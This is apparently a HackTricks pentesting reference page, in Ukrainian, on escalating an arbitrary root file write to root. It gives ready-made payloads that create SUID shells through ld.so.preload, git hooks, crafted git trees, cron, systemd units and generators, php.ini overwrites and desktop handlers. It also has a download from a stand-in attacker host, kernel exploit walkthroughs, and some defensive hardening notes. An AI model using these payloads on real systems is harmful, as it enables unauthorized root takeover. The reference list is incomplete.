# Запис довільного файла від імені root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` — це загальносистемний список shared objects, які динамічний компонувальник завантажує перед іншими shared objects. Режим безпечного виконання накладає додаткові обмеження на попереднє завантаження, тому шлях до бібліотеки, як-от `/tmp/pe.so`, не є універсальним прийомом для SUID-бінарних файлів.\
Якщо ви можете створити або змінити цей файл, процес, який його завантажує, завантажить зазначену бібліотеку перед іншими shared objects, що дасть змогу виконати код у контексті цього процесу.<sup>[[12]](#references)</sup>

Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### OCR output як обмежений запис файлу

Сервіс OCR, який дозволяє викликачеві вибрати ім’я збереженого файлу, може перетворити розпізнаний текст зображення на примітив **обмеженого запису файлу**. Збережені байти — це розпізнаний текст, а не байти зображення, тому перевірте результат OCR на синтаксичні помилки. Якщо дозволене місце призначення доступне для виконання вебсервером і допускає ім’я файлу з розширенням `.php`, цей текст може виконуватися під час запиту до нього. У MakeSense локально доступний застосунок OCR зберігав текст у `/saved/`; його PHP-сервер, запущений від root, потім виконав збережений файл від root. Запис був обмежений цією директорією, а обхід шляху не демонструвався.<sup>[[37]](#references)</sup>

Привілеї, отримані під час виконання, належать **процесу, що обслуговує PHP**, а не автоматично процесу OCR-запису. Перевірте відображення місця призначення на виконуваний файл і ідентичність середовища виконання; якщо процес OCR-запису працює від root, а вебсервер — без привілеїв, це не означає, що PHP виконуватиметься від root.<sup>[[37]](#references)</sup> Порівняйте з прямим [сценарієм завантаження у вебкорінь](../../pentesting-web/file-upload/).

### Git hooks

**Git hooks** — це виконувані скрипти, які запускаються під час подій у репозиторії, зокрема операцій commit і merge. Якщо ці дії виконує **привілейований скрипт або користувач**, а зловмисник може **записувати у папку `.git`**, hook можна використати для **підвищення привілеїв**.<sup>[[13]](#references)</sup>

Наприклад, можна **створити скрипт** у git-репозиторії в **`.git/hooks`**, щоб він запускався щоразу під час створення нового commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Обхід шляху під час експорту дерева Git із привілеями

Привілейований синхронізатор може не виконувати checkout, а натомість перераховувати контрольований зловмисником репозиторій за допомогою `git ls-tree`, читати кожен blob через `git cat-file`, об’єднувати повідомлений шлях із каталогом підготовки та самостійно записувати файл. Якщо він поєднує `-c safe.directory=*` (вимикаючи перевірку Git на репозиторії з іншим власником) із відсутністю перевірки, що цільовий шлях залишається всередині каталогу, це дає змогу довільно записувати файли з привілеями синхронізатора. Абсолютне ім’я елемента дерева змушує `os.path.join(stage, name)` у Python відкинути `stage`; відносне ім’я з `../` виходить за межі каталогу під час розв’язання шляху файловою системою. Оскільки програма матеріалізує необроблене дерево, а не просить Git виконати checkout, перевірка шляхів під час checkout не захищає ціль запису.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Шукайте такий шаблон коду в root-сервісах, таймерах, агентах розгортання, засобах імпорту шаблонів і завданнях резервного копіювання/відновлення:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Запис дерева кодується як `<mode> SP <name> NUL <raw object ID>`. Опція `git hash-object --literally` навмисно дозволяє дані об’єкта, які звичайний парсер або `git fsck` можуть відхилити, тож у тимчасовому клоні можна створити дерево, ім’я файлу в якому є абсолютним шляхом призначення. У цьому прикладі створюється blob файла cron, створене дерево обгортається в коміт, а гілка переміщується на нього; для експлуатації все одно потрібен дозвіл на оновлення репозиторію, який використовує привілейоване завдання, і Git-сервер, що приймає некоректний об’єкт.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Посилений захист має охоплювати як приймання репозиторіїв, так і кінцеву операцію з файловою системою:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Замініть `safe.directory=*` на точний перелік репозиторіїв, яким має довіряти служба, і, де можливо, обробляйте репозиторії без привілеїв root.
- Відхиляйте абсолютні імена та будь-які компоненти `.` або `..` до створення файлів. Після об’єднання шляхів канонізуйте шлях і перевірте, що ціль залишається всередині визначеного кореневого каталогу.
- Уникайте гонок symlink типу «перевірити, а потім відкрити»: відкривайте файли відносно дескриптора довіреного каталогу, а в Linux для шляхів, контрольованих атакувальником, використовуйте `openat2()` з `RESOLVE_BENEATH` і `RESOLVE_NO_SYMLINKS`.
- Віддавайте перевагу звичайному checkout в ізольованому каталозі, а не повторній реалізації checkout на основі виводу plumbing-команд. Якщо потрібне отримання raw-об’єктів, увімкніть перевірку на стороні receive, наприклад `receive.fsckObjects=true`; не послаблюйте перевірки `receive.fsck.*`, пов’язані з іменами шляхів, потрібні для відхилення спеціально сформованих дерев.

### Розгортання конфігурації з підвищеними привілеями

Деякі служби керування зберігають запланований стан системи у файлі конфігурації, а згодом розгортають його з підвищеними привілеями. Наприклад, [openmediavault зберігає конфігурацію в `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), а його [інтерфейс RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) може застосовувати зміни служб. Якщо обліковий запис із нижчими привілеями може записувати цей файл або замінювати його, перевірте, чи може він також запитати дозволене розгортання та чи використовує вибраний модуль змінене поле від імені root. Ключі облікових записів SSH, заплановані команди та встановлення пакунків мають різні передумови; сама наявність файлу або можливість запису у файл XML не доводить жодної з них. Перевірте права доступу до файлу й батьківського каталогу, групи користувача та його авторизацію RPC, встановлену версію і фактичний компонент, який використовує конфігурацію. Під час переліку не редагуйте конфігурацію й не запускайте її застосування.

Файли визначень дій Fail2Ban у `/etc/fail2ban/action.d/` — ще одна межа привілейованої конфігурації. Користувач, який може записувати в цей каталог і шукати в ньому, може мати змогу замінити визначення дії або додати перевизначення, але самі права доступу до каталогу не підтверджують можливість виконання коду. Переконайтеся, що ввімкнений jail справді вибирає відповідну дію, що служба Fail2Ban виконує її з вищими привілеями та що відбудуться авторизоване перезавантаження/перезапуск і відповідна подія блокування. Не пов’язаний із цим дозвіл sudo на перезапуск Fail2Ban має значення лише тоді, коли він стосується точного виклику служби й завантажується змінене визначення. [Конфігурація дій Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) описує зв’язок між каталогом дій і jail; [приклад дії](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) показує, що `actionban` запускається під час блокування з правами користувача служби. Перевіряйте права доступу й ефективну конфігурацію, не змінюючи дій і не запускаючи блокування під час переліку.

Окрема межа виникає, коли ввімкнений jail Fail2Ban використовує дію надсилання пошти з даними, доповненими через WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) стосувалася недовіреного тексту WHOIS, переданого через pipe до GNU mailutils `mail`, обробка escape-послідовностей у якому могла запускати команду. Користувач із нижчими привілеями, який може записувати файли, може впливати на відповідь, якщо здатен змінити конфігурацію перевизначення сервера **вибраного WHOIS-клієнта**; [файл `whois.conf(5)` у Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) описує один із таких файлів, але його шлях і використання залежать від встановленої системи. Перевірте ефективні jail і дію, обліковий запис служби, фактичний WHOIS-клієнт і шлях до його конфігурації, реалізацію mail, можливість контролювати відповідь, а також виправлення від постачальника або його backport. Файл конфігурації WHOIS, доступний для запису, версія Fail2Ban чи сама дія надсилання пошти окремо не доводять наявність цього ланцюжка; під час пасивного переліку не надсилайте запити до зовнішнього сервера й не запускайте блокування.

### Створення файлів через TFTP і привілейовані хуки пакунків

Доступна служба TFTP може перетнути межу контейнера або локального користувача, якщо її **ефективні** налаштування tftpd-hpa запускають її від імені root, задають корінь файлової системи як каталог `--secure` і вмикають `--create`. [Посібник tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) описує параметри створення файлів і користувача. Це може дати змогу створити новий файл у привілейованому каталозі конфігурації, зокрема `/etc/apt/apt.conf.d/`; замінити наявний файл усе ще може бути неможливо. [Посібник із конфігурації APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) описує команди `APT::Update::Pre-Invoke`. Запущений від root `apt update` може стати споживачем із вищими привілеями **лише за умови**, що він прочитає новий файл конфігурації. Перевірте фактичні аргументи й обліковий запис запущеного демона, доступність мережі та фільтрацію, правила створення файлів у цільовому каталозі, ефективну область конфігурації APT і наступний привілейований запуск. Файл зі стандартними налаштуваннями, каталог призначення, доступний для запису, або запланована команда APT самі по собі не доводять наявність усього ланцюжка. Під час пасивного аналізу читайте лише обмежені за обсягом локальні конфігурації та метадані, не завантажуючи файли й не запускаючи APT.

### Файли Cron і часу

Якщо ви можете **записувати файли, пов’язані з cron, які виконує root**, зазвичай можна домогтися виконання коду під час наступного запуску завдання. Серед цікавих цілей:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Власний crontab root у `/var/spool/cron/` або `/var/spool/cron/crontabs/`
- Таймери `systemd` і служби, які вони запускають

Швидкі перевірки:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Типові шляхи зловживання:

- **Додати нове завдання cron від root** до `/etc/crontab` або файлу в `/etc/cron.d/`
- **Замінити скрипт**, який уже запускається через `run-parts`
- **Встановити бекдор у наявну ціль таймера**, змінивши скрипт або бінарний файл, який вона запускає

Мінімальний приклад payload для cron:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Якщо ви можете записувати лише до каталогу cron, який використовується `run-parts`, натомість помістіть туди виконуваний файл:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Примітки:

- `run-parts` зазвичай ігнорує назви файлів із крапками, тому краще використовувати назви на кшталт `backup`, а не `backup.sh`.<sup>[[15]](#references)</sup>
- Деякі системи використовують таймери `systemd` замість класичного cron, але суть зловживання та сама: **змінити те, що root виконає пізніше**.<sup>[[20]](#references)</sup>

### Файли служб і сокетів

Якщо ви можете записувати **файли unit `systemd`** або файли, на які вони посилаються, ви можете отримати виконання коду від імені root, перезавантаживши конфігурацію та перезапустивши unit або дочекавшись активації служби/сокета.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Також перевірте права на запис і пошук у самому каталозі системних unit-файлів, зокрема ACL: користувач може створити новий unit у `/etc/systemd/system`, навіть якщо читання/перегляд вмісту каталогу заборонено. Сам цей шлях нічого не запускає. Переконайтеся, що менеджер системи завантажить новий unit, що викликач має ефективний дозвіл на `systemctl start` або `restart` із правами root для його назви (або інший привілейований шлях активації), а служба запускається від імені потрібного користувача. Зміна на диску вже завантаженого unit може потребувати `daemon-reload`; для unit із новою назвою поведінка завантаження відрізняється. Перш ніж вважати правило перезапуску з узагальнювальним символом достатнім, перевірте точні аргументи sudo та винятки. Див. [шлях пошуку unit-файлів systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) і [семантику завантаження та перезавантаження конфігурації systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Цікаві цілі:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Перевизначення drop-in у `/etc/systemd/system/<unit>.d/*.conf`
- Скрипти/бінарні файли служб, на які посилаються `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Шляхи `EnvironmentFile=`, доступні для запису, які завантажує служба root

Швидкі перевірки:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Поширені способи зловживання:

- **Перезаписати `ExecStart=`** у сервісному unit-файлі, що належить root і який можна змінювати
- **Додати drop-in override** зі шкідливим `ExecStart=` і спершу очистити старе значення
- **Вбудувати backdoor у скрипт/бінарний файл**, на який уже посилається unit-файл
- **Перехопити socket-activated service**, змінивши відповідний файл `.service`, який запускається після отримання з’єднання сокетом

Приклад шкідливого override:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Типовий потік активації:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Якщо ви не можете самостійно перезапустити служби, але можете редагувати socket-activated unit, можливо, достатньо **дочекатися підключення клієнта**, щоб запустити backdoored службу від імені root.<sup>[[17]](#references)</sup>

### Каталоги генераторів systemd

**System generators** — це виконувані файли, які запускає менеджер системи перед завантаженням unit-файлів — як під час завантаження системи, так і під час перезавантаження конфігурації. Тому доступ на запис до каталогу system-generator (або до наявного виконуваного generator) — це безпосередній примітив виконання коду від імені root, який легко не помітити, якщо під час аудиту перевіряють лише файли `*.service` і `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Звичайний порядок пошуку: `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` і `/usr/lib/systemd/system-generators/` (у деяких дистрибутивах `/lib/systemd/system-generators/` доступний через об’єднання каталогів `/usr`). Виконуваний файл з однаковою назвою в каталозі, що стоїть раніше в цьому списку, затінює файл у пізнішому каталозі. Не плутайте ці **каталоги вхідних виконуваних файлів** із `/run/systemd/generator`, `/run/systemd/generator.early` і `/run/systemd/generator.late`, які містять тимчасові unit-файли, створені generators.<sup>[[35]](#references)</sup>

Швидкі перевірки:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Щойно створений генератор має бути позначений як виконуваний. Якщо примітив запису дає змогу змінювати байти, але не режим доступу, націльтеся на вже виконуваний генератор: його перезапис на місці зазвичай зберігає метадані. Якщо доступний для запису сам каталог, створіть новий файл і позначте його як виконуваний.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Запуск `systemctl daemon-reload` для **system** manager потребує відповідної авторизації, але повторно запускає кожен system generator; інакше дочекайтеся привілейованого перезавантаження конфігурації, операції з пакетом або перезавантаження системи. Каталоги user-generator, як-от `~/.config/systemd/user-generators/`, виконуються в user manager і **самі по собі не надають root-доступу**.<sup>[[35]](#references)</sup>

Для hardening і пошуку загроз перевіряйте кожен компонент шляху та ACL, а не лише біти режиму доступу в кінці; фіксуйте хеші та власника пакета для generator-ів і сповіщайте про створення, перейменування, зміну вмісту або дозволів у всіх каталогах вхідних даних system generator. Моніторинг запису важливий, оскільки одноразовий generator може видалити себе після виконання, тоді як дерево згенерованих unit-ів у `/run/systemd/generator*` перебудовується під час наступного перезавантаження конфігурації.<sup>[[35]](#references)[[36]](#references)</sup>

### Перезаписати обмежувальний `php.ini`, який використовує привілейована PHP sandbox

Деякі спеціальні daemon-и перевіряють наданий користувачем PHP-код, запускаючи `php` з **обмежувальним `php.ini`** (наприклад, `disable_functions=exec,system,...`). Якщо код у sandbox усе ще має **будь-який примітив запису** (наприклад, `file_put_contents`) і ви можете дістатися **точного шляху до `php.ini`**, який використовує daemon, то можете **перезаписати цю конфігурацію**, щоб зняти обмеження, а потім надіслати другий payload, який виконається з підвищеними привілеями.<sup>[[2]](#references)</sup>

Типовий процес:

1. Перший payload перезаписує конфігурацію sandbox.
2. Другий payload виконує код після повторного ввімкнення небезпечних функцій.

Мінімальний приклад (замініть шлях на той, який використовує daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Якщо daemon працює від root (або перевіряє шляхи, власником яких є root), другий запуск створює контекст root. По суті, це **підвищення привілеїв через перезапис конфігурації**, коли середовище виконання в sandbox усе ще може записувати файли.

### binfmt_misc

`binfmt_misc` надає доступ до реєстрацій у `/proc/sys/fs/binfmt_misc`; кожна реєстрація пов’язує шаблон типу файлу з інтерпретатором. Вплив на привілеї залежить від того, хто може змінювати реєстрацію та який процес згодом запускає файл, що їй відповідає, тож перевірте ці умови, перш ніж вважати це шляхом до підвищення привілеїв.<sup>[[21]](#references)</sup>

Виконуваний допоміжний файл із `CAP_DAC_OVERRIDE` може створювати окремий шлях реєстрації, якщо він приймає контрольовані користувачем дані й записує їх у `/proc/sys/fs/binfmt_misc/register`, навіть коли користувач не може записувати безпосередньо в цей вузол. Під час переліку перевірте вхідні дані допоміжного файлу та його поведінку під час запису, не запускаючи його. Якщо зареєстроване правило використовує прапорець `C`, інтерпретатор отримує облікові дані на основі відповідного бінарного файлу; тому відповідний файл SUID, власником якого є root, може запустити контрольований користувачем інтерпретатор від root. Переконайтеся, що змонтовано `binfmt_misc` і визначено політику реєстрації, перевірте ефективні можливості допоміжного файлу, точне правило та шлях до інтерпретатора, виконуваний файл SUID і те, чи не пригнічують перехід SUID параметр `no_new_privs` або монтування `nosuid`. Сам біт можливості або вбудований рядок зі шляхом — лише підказка для подальшої перевірки.<sup>[[21]](#references)</sup> Умови пригнічення SUID див. у [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html).

### Перезапис обробників схем (наприклад, http: або https:)

У середовищах робочого стола для вибору програми для URI-схем використовуються MIME-асоціації та записи desktop. Зловмисник, який може записувати у відповідні каталоги конфігурації користувача й записів desktop, може перенаправити ці схеми на контрольований ним засіб запуску. Змінивши файл `$HOME/.config/mimeapps.list`, щоб він указував на шкідливий файл як обробник URL-адрес HTTP і HTTPS (наприклад, `x-scheme-handler/http=evil.desktop` і `x-scheme-handler/https=evil.desktop`), зловмисник може домогтися запуску цього запису desktop після натискання користувачем посилання.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root запускає скрипти/бінарні файли, доступні користувачу для запису

Якщо привілейований процес запускає щось на кшталт `/bin/sh /home/username/.../script` (або будь-який бінарний файл у каталозі, що належить непривілейованому користувачу), ви можете перехопити його:<sup>[[1]](#references)</sup>

- **Виявлення запуску:** відстежуйте процеси за допомогою pspy, щоб виявити запуск Root файлів за шляхами, контрольованими користувачем.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Перевірте можливість запису:** переконайтеся, що цільовий файл і його каталог належать вашому користувачу та доступні йому для запису.
- **Перехопіть ціль:** створіть резервну копію оригінального бінарного файла/скрипту й помістіть payload, який створює SUID-оболонку (або виконує будь-яку іншу дію від root), а потім відновіть дозволи:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Запустіть привілейовану дію** (наприклад, натисніть кнопку UI, яка запускає helper). Коли root повторно запустить hijacked шлях, отримайте shell з підвищеними привілеями за допомогою `./rootshell -p`.

### Зміна файлів привілейованих бінарних файлів лише в page cache

Деякі kernel bugs не змінюють файл **на диску**. Натомість вони дають змогу змінювати лише копію читабельного файла в **page cache**. Якщо ціллю є бінарний файл із **setuid** або інший файл, який запускається від імені **root**, під час наступного запуску можуть виконатися контрольовані зловмисником байти з пам’яті, що дасть змогу підвищити привілеї, хоча хеш файла на диску не змінився.<sup>[[3]](#references)[[4]](#references)</sup>

Це корисно розглядати як **примітив запису у файл лише під час виконання**:<sup>[[3]](#references)</sup>

- **Диск залишається чистим**: inode і байти на диску не змінюються
- **Пам’ять змінюється**: процеси, що читають або виконують вміст кешованої сторінки, отримують вміст, змінений зловмисником
- **Ефект тимчасовий**: зміни зникають після перезавантаження або витіснення з кешу

Цей примітив займає проміжне місце між класичним **довільним записом у файл** і старішими багами **зловживання page cache**, як-от Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW покладався на race condition
- Dirty Pipe мав обмеження на позицію запису
- Примітив лише для page cache може бути надійнішим, якщо вразливий шлях дає змогу безпосередньо записувати в кешовані сторінки, прив’язані до файлу

#### Загальний процес privesc

1. Отримайте kernel-примітив для запису в сторінки page cache, прив’язані до файла
2. Використайте його проти **читабельного привілейованого бінарного файла** або іншого файла, який запускається від імені root
3. Запустіть файл **до** того, як сторінку буде витіснено з кешу
4. Отримайте виконання коду від імені root, поки файл на диску все ще виглядає незміненим

Типові цілі з високою цінністю:

- Бінарні файли **setuid-root**
- Helpers, які запускаються **root-сервісами**
- Бінарні файли, які часто запускаються з **контейнерів, що використовують спільні з хостом kernel/page cache**

#### Приклад шляху з AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) — хороший приклад цього класу. Вразливий шлях був у Linux API криптографії для userspace (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` може переміщувати посилання на сторінки page cache з читабельного файла до TX scatterlist криптографічної підсистеми
- шлях дешифрування `algif_aead` на місці повторно використовував буфери джерела й призначення
- далі `authencesn` записував дані в область тегу призначення
- якщо ця область усе ще посилалася на сторінки файла, додані через splice, запис потрапляв у **page cache цільового файла**

Отже, цікавою є не сама CVE, а такий шаблон:

- **передати сторінки кешу, прив’язані до файла, у kernel-підсистему**
- змусити підсистему **вважати їх вихідними даними для запису**
- виконати невелике контрольоване перезаписування в пам’яті

У публічному PoC для зміни `/usr/bin/su` в пам’яті використовували повторювані **4-байтові записи**, після чого запускали його.<sup>[[4]](#references)[[7]](#references)</sup>

#### Приклад шляху з ESP / XFRM + клонування netfilter TEE

DirtyClone (CVE-2026-43503) демонструє інший варіант того самого шаблону **запису в root-файл лише через page cache**, але цього разу точкою запису є **дешифрування IPsec ESP**, а не `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Важливий прийом — **підміна метаданих**:

- `splice()` вставляє **сторінку page cache, прив’язану до файла й доступну лише для читання**, у пакет ESP-in-UDP
- початкове пом’якшення DirtyFrag позначало цей skb прапорцем `SKBFL_SHARED_FRAG`, щоб `esp_input()` **копіював дані перед дешифруванням**
- netfilter `TEE` дублює пакет через `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- клон зберігає **посилання на ту саму фізичну сторінку page cache**, але втрачає `SKBFL_SHARED_FRAG`
- після цього `esp_input()` вважає клон безпечним і виконує дешифрування **in-place `cbc(aes)`** над сторінкою, прив’язаною до файла

Отже, висновок для рецензентів ширший за цю CVE: якщо пом’якшення покладається на **метадані skb/сторінки**, щоб визначити, чи потрібно спочатку копіювати дані, будь-який шлях **клонування/копіювання, який зберігає базову сторінку, але втрачає метадані**, може непомітно знову відкрити примітив запису.

Типовий процес експлуатації:

1. Викличте `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, щоб отримати **`CAP_NET_ADMIN` у приватному network namespace**
2. Увімкніть loopback і встановіть правило **netfilter `TEE`** у `mangle/OUTPUT`
3. Встановіть XFRM ESP transport SA через `NETLINK_XFRM`
4. Закодуйте кожне цільове 4-байтове слово в полі SA `seq_hi` (прийом вибору слова з DirtyFrag)
5. Надішліть пакет ESP-in-UDP зі сторінкою, доданою через splice, щоб **клон TEE** потрапив до `esp_input()` і був дешифрований **in-place**
6. Повторюйте, доки копія `/usr/bin/su` або іншого привілейованого виконуваного файла в page cache не міститиме код, контрольований зловмисником

З практичного погляду вплив такий самий, як у прикладі з `AF_ALG`: файл на диску залишається чистим, але `execve()` використовує **змінені байти page cache** і надає root.<sup>[[8]](#references)[[9]](#references)</sup>

Корисні перевірки на наявність цієї вразливості:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Короткострокове зменшення поверхні атаки тут також залежить від шляху: оновлення до ядра з комітом `48f6a5356a33` виправляє шлях `clone`, блокування автозавантаження `xt_TEE` усуває **етап відмивання прапорця**, а блокування `esp4` / `esp6` усуває **приймач розшифрування**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Виявлення та пошук

Якщо ви підозрюєте наявність цього класу помилок, не покладайтеся лише на перевірки цілісності диска. Також перевірте:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Значення конфігурації нижче розрізняють інтерфейс, який можна завантажити, та інтерфейс, вбудований у ядро; правила збирання crypto зіставляють `CONFIG_CRYPTO_USER_API_AEAD` з `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` можна завантажувати та вивантажувати як модуль
- `CONFIG_CRYPTO_USER_API_AEAD=y`: інтерфейс вбудований у ядро
- setuid-бінарні файли — хороші цілі, оскільки патча лише для page cache може бути достатньо, щоб перетворити локальний foothold на root

#### Зменшення поверхні атаки для шляху `algif_aead`

Якщо вразливий інтерфейс надається модулем, який можна завантажити:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Якщо це скомпільовано в ядро, у деяких звітах про розкриття вразливостей повідомлялося про блокування шляху init за допомогою:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Цей спосіб пом’якшення варто пам’ятати й для інших kernel LPE: якщо експлуатація залежить від певного необов’язкового інтерфейсу, його вимкнення або блокування може зірвати шлях експлуатації ще до того, як стане доступним повне оновлення ядра.<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo — перехоплення скрипту, що запускається від root, у доступному для запису користувачем каталозі PaperCut](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — поширені запитання](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Розкриття в Openwall oss-security щодо CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Виправлення в Linux stable: crypto: algif_aead — повернення до роботи поза місцем](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — рекомендації щодо CVE-2026-31431](https://copy.fail/)
- [7] [Технічний опис Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Репозиторій DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: аналіз і експлуатація варіанта Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Виправлення в Linux: net: skb: збереження `SKBFL_SHARED_FRAG` у `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Попереднє пом’якшення в Linux: встановлення `SKBFL_SHARED_FRAG` для UDP-пакетів, переданих через splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
